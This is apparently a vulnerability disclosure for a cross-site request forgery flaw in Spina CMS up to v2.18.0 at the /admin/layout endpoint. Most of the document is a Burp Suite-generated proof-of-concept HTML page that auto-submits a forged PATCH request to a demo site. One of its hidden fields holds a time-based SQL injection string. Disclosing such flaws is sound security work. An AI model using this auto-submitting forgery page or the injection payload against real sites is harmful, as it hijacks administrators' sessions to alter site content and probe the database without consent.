 [description]
 
Spina CMS v2.18.0 was discovered to contain a Cross-Site Request Forgery (CSRF) vulnerability via the URI /admin/layout.

 ------------------------------------------

 [Vulnerability Type]
 
 Cross-Site Request Forgery (CSRF)

 ------------------------------------------
 [Vendor of Product]
 
 Spina CMS,https://github.com/SpinaCMS/Spina

 ------------------------------------------

 [Affected Product Code Base]
 
 <=v2.18.0

 ------------------------------------------

 [Impact Escalation of Privileges]
 
 true

 ------------------------------------------
 [POC]
<img width="1023" alt="图片" src="https://github.com/user-attachments/assets/aa450a2d-e288-4dcc-925b-90f5b8b01e16">
<img width="604" alt="图片" src="https://github.com/user-attachments/assets/c2fa9e3d-fca7-48e0-84c8-60954fd0a8f9">
<img width="1039" alt="图片" src="https://github.com/user-attachments/assets/fd2a90f9-91bc-490a-8577-4de6d6a54962">







```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://spinacms-demo.herokuapp.com/admin/layout" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="authenticity&#95;token" value="&#43;B3na3MtWSAxL5t3intHXLBAw&#43;Qw5NB2i4xCwg9vff9RxcH2&#47;&#47;xJPhKWY8tvucsoclA7K0RLprRk0Ba6jtH4zw&#61;&#61;" />
      <input type="hidden" name="locale" value="en" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;name&#93;" value="line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;title&#93;" value="Line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;0&#93;&#91;content&#93;" value="0&quot;XOR&#40;if&#40;now&#40;&#41;&#61;sysdate&#40;&#41;&#44;sleep&#40;15&#41;&#44;0&#41;&#41;XOR&quot;Z" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Text" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;name&#93;" value="body" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;title&#93;" value="Body" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;1&#93;&#91;content&#93;" value="&lt;div&gt;aaaaaaa&lt;&#47;div&gt;" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;name&#93;" value="repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;title&#93;" value="Repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;title&#93;" value="Repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;name&#93;" value="repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;title&#93;" value="Line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;name&#93;" value="line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;content&#93;" value="dfafdsa" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;title&#93;" value="Body" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Text" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;name&#93;" value="body" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;content&#93;" value="&lt;div&gt;4111111111111111&lt;&#47;div&gt;" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;title&#93;" value="Image" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Image" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;name&#93;" value="image" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;signed&#95;blob&#95;id&#93;" value="4111111111111111" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;filename&#93;" value="MmzHrrdb" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;image&#95;id&#93;" value="20" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;alt&#93;" value="4111111111111111" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;3&#93;&#91;title&#93;" value="Image&#32;collection" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;3&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;ImageCollection" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;0&#93;&#91;parts&#95;attributes&#93;&#91;3&#93;&#91;name&#93;" value="image&#95;collection" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;title&#93;" value="Repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;name&#93;" value="repeater" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;title&#93;" value="Line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;name&#93;" value="line" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;0&#93;&#91;content&#93;" value="4111111111111111" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;title&#93;" value="Body" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Text" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;name&#93;" value="body" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;1&#93;&#91;content&#93;" value="&lt;div&gt;4111111111111111&lt;&#47;div&gt;" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;title&#93;" value="Image" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;Image" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;name&#93;" value="image" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;signed&#95;blob&#95;id&#93;" value="4111111111111111" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;filename&#93;" value="MmzHrrdb" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;image&#95;id&#93;" value="20" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;2&#93;&#91;alt&#93;" value="4111111111111111" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;3&#93;&#91;title&#93;" value="Image&#32;collection" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;3&#93;&#91;type&#93;" value="Spina&#58;&#58;Parts&#58;&#58;ImageCollection" />
      <input type="hidden" name="account&#91;en&#95;content&#95;attributes&#93;&#91;2&#93;&#91;content&#95;attributes&#93;&#91;1&#93;&#91;parts&#95;attributes&#93;&#91;3&#93;&#91;name&#93;" value="image&#95;collection" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>


```
